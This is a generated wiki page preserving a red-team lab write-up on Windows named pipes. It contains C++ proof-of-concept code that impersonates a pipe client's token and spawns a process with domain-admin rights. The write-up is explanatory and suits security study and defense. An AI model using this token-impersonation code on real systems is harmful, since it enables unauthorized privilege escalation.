---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Windows NamedPipes 101 + Privilege Escalation

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-privilege-escalation-windows-namedpipes-privilege-escalation` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Windows NamedPipes 101 + Privilege Escalation](../../topics/offensive-security/windows-namedpipes-101-privilege-escalation.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-privilege-escalation-windows-namedpipes-privilege-escalation |
| name | Windows NamedPipes 101 + Privilege Escalation |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Screenshot from 2019-04-02 23-44-22.png
- Screenshot from 2019-04-04 23-51-48.png
- Screenshot from 2019-04-06 14-40-57.png
- Screenshot from 2019-04-06 14-59-41.png
- Screenshot from 2019-04-06 15-09-05.png
- Screenshot from 2019-04-07 18-00-49.png
- Screenshot from 2019-05-06 12-59-57.png
_body: "# Windows NamedPipes 101 + Privilege Escalation\n\n## Overview\n\nA `pipe` is a block of shared memory that processes\
  \ can use for communication and data exchange.\n\n`Named Pipes` is a Windows mechanism that enables two unrelated processes\
  \ to exchange data between themselves, even if the processes are located on two different networks. It's very simar to client/server\
  \ architecture as notions such as `a named pipe server` and a named `pipe client` exist.\n\nA named pipe server can open\
  \ a named pipe with some predefined name and then a named pipe client can connect to that pipe via the known name. Once\
  \ the connection is established, data exchange can begin.\n\nThis lab is concerned with a simple PoC code that allows:\n\
  \n* creating a single-threaded dumb named pipe server that will accept one client connection\n* named pipe server to write\
  \ a simple message to the named pipe so that the pipe client can read it\n\n## Code\n\nBelow is the PoC for both the server\
  \ and the client:\n\n{% tabs %}\n{% tab title=\"namedPipeServer.cpp\" %}\n```cpp\n#include \"pch.h\"\n#include <Windows.h>\n\
  #include <iostream>\n\nint main() {\n\tLPCWSTR pipeName = L\"\\\\\\\\.\\\\pipe\\\\mantvydas-first-pipe\";\n\tLPVOID pipeBuffer\
  \ = NULL;\n\tHANDLE serverPipe;\n\tDWORD readBytes = 0;\n\tDWORD readBuffer = 0;\n\tint err = 0;\n\tBOOL isPipeConnected;\n\
  \tBOOL isPipeOpen;\n\twchar_t message[] = L\"HELL\";\n\tDWORD messageLenght = lstrlen(message) * 2;\n\tDWORD bytesWritten\
  \ = 0;\n\n\tstd::wcout << \"Creating named pipe \" << pipeName << std::endl;\n\tserverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX,\
  \ PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);\n\t\n\tisPipeConnected = ConnectNamedPipe(serverPipe, NULL);\n\tif (isPipeConnected)\
  \ {\n\t\tstd::wcout << \"Incoming connection to \" << pipeName << std::endl;\n\t}\n\t\n\tstd::wcout << \"Sending message:\
  \ \" << message << std::endl;\n\tWriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);\n\t\n\treturn 0;\n\
  }\n```\n{% endtab %}\n\n{% tab title=\"namedPipeClient.cpp\" %}\n```cpp\n#include \"pch.h\"\n#include <iostream>\n#include\
  \ <Windows.h>\n\nconst int MESSAGE_SIZE = 512;\n\nint main()\n{\n\tLPCWSTR pipeName = L\"\\\\\\\\10.0.0.7\\\\pipe\\\\mantvydas-first-pipe\"\
  ;\n\tHANDLE clientPipe = NULL;\n\tBOOL isPipeRead = true;\n\twchar_t message[MESSAGE_SIZE] = { 0 };\n\tDWORD bytesRead =\
  \ 0;\n\n\tstd::wcout << \"Connecting to \" << pipeName << std::endl;\n\tclientPipe = CreateFile(pipeName, GENERIC_READ |\
  \ GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);\n\t\n\twhile (isPipeRead) {\n\t\tisPipeRead = ReadFile(clientPipe, &message,\
  \ MESSAGE_SIZE, &bytesRead, NULL);\n\t\tstd::wcout << \"Received message: \" << message;\n\t}\n\n\treturn 0;\n}\n```\n{%\
  \ endtab %}\n{% endtabs %}\n\n## Execution\n\nBelow shows the named pipe server and named pipe client working as expected:\n\
  \n![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22.png>)\n\nWorth nothing that the named pipes communication\
  \ by default uses SMB protocol:\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-04 23-51-48.png>)\n\nChecking how\
  \ the process maintains a handle to our named pipe `mantvydas-first-pipe`:\n\n![](<../../.gitbook/assets/Screenshot from\
  \ 2019-04-06 14-40-57.png>)\n\nSimilary, we can see the client having an open handle to the named pipe:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-06 14-59-41.png>)\n\nWe can even see our pipe with powershell:\n\n```csharp\n((Get-ChildItem \\\\.\\pipe\\\
  ).name)[-1..-5]\n```\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-06 15-09-05.png>)\n\n## Token Impersonation\n\
  \nIt is possible for the named pipe server to impersonate the named pipe client's security context by leveraging a `ImpersonateNamedPipeClient`\
  \ API call which in turn changes the named pipe server's current thread's token with that of the named pipe client's token.\n\
  \nWe can update the the named pipe server's code like this to achieve the impersonation - note that modifications are seen\
  \ in line 25 and below:&#x20;\n\n```cpp\nint main() {\n\tLPCWSTR pipeName = L\"\\\\\\\\.\\\\pipe\\\\mantvydas-first-pipe\"\
  ;\n\tLPVOID pipeBuffer = NULL;\n\tHANDLE serverPipe;\n\tDWORD readBytes = 0;\n\tDWORD readBuffer = 0;\n\tint err = 0;\n\t\
  BOOL isPipeConnected;\n\tBOOL isPipeOpen;\n\twchar_t message[] = L\"HELL\";\n\tDWORD messageLenght = lstrlen(message) *\
  \ 2;\n\tDWORD bytesWritten = 0;\n\n\tstd::wcout << \"Creating named pipe \" << pipeName << std::endl;\n\tserverPipe = CreateNamedPipe(pipeName,\
  \ PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);\n\t\n\tisPipeConnected = ConnectNamedPipe(serverPipe,\
  \ NULL);\n\tif (isPipeConnected) {\n\t\tstd::wcout << \"Incoming connection to \" << pipeName << std::endl;\n\t}\n\t\n\t\
  std::wcout << \"Sending message: \" << message << std::endl;\n\tWriteFile(serverPipe, message, messageLenght, &bytesWritten,\
  \ NULL);\n\t\n\tstd::wcout << \"Impersonating the client...\" << std::endl;\n\tImpersonateNamedPipeClient(serverPipe);\n\
  \terr = GetLastError();\t\n\n\tSTARTUPINFO\tsi = {};\n\twchar_t command[] = L\"C:\\\\Windows\\\\system32\\\\notepad.exe\"\
  ;\n\tPROCESS_INFORMATION pi = {};\n\tHANDLE threadToken = GetCurrentThreadToken();\n\tCreateProcessWithTokenW(threadToken,\
  \ LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);\n\n\treturn 0;\n}\n```\n\nRunning the server\
  \ and connecting to it with the client that is running under administrator@offense.local security context, we can see that\
  \ the main thread of the named server pipe assumed the token of the named pipe client - offense\\administrator, although\
  \ the PipeServer.exe itself is running under ws01\\mantvydas security context. Sounds like a good way to escalate privileges?\n\
  \n![](<../../.gitbook/assets/Screenshot from 2019-04-07 18-00-49.png>)\n\nNot so fast - unfortunately, I was not able to\
  \ properly duplicate the token and use it to our advantage with the following code:\n\n```cpp\n\tHANDLE \n\t\tthreadToken\
  \ = NULL,\n\t\tduplicatedToken = NULL;\n\n\tOpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &threadToken);\n\
  \tDuplicateTokenEx(threadToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicatedToken);\n\terr =\
  \ GetLastError();\n\tCreateProcessWithTokenW(duplicatedToken, 0, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);\n\
  ```\n\nFor some reason, the DuplicateTokenEx call would return an error `1346 ERROR_BAD_IMPERSONATION_LEVEL` and I could\
  \ not figure out what the issue was, so if you know, I would like to hear from you.\n\n### Update #1\n\nI was contacted\
  \ by [Raymond Roethof](https://www.thalpius.com) and [@exist91240480](https://twitter.com/exist91240480) (huge thank you\
  \ both!) and they suggested that my named pipe server was not holding `SeImpersonatePrivilege`which was causing the `ERROR_BAD_IMPERSONATION_LEVEL`\
  \ when calling `DuplicateTokenEx`. Once the server hold the required privilege, everything worked as expected.\n\nNote how\
  \ `PipeServer.exe` running as a local admin `ws01\\mantvydas` spawned a cmd shell with domain admin privileges `offense\\\
  administrator`- due to successfull token impersonation via named pipes:\n\n![](<../../.gitbook/assets/Screenshot from 2019-05-06\
  \ 12-59-57.png>)\n\n{% hint style=\"info\" %}\nNote that this technique is used by meterpreter when attempting to escalate\
  \ privileges when `GetSystem` command is used.. The same technique is used in the `PowerUp`.\n{% endhint %}\n\n## References\n\
  \n{% embed url=\"https://docs.microsoft.com/en-us/windows/desktop/ipc/interprocess-communications\" %}"
_relative_path: offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation.md
````
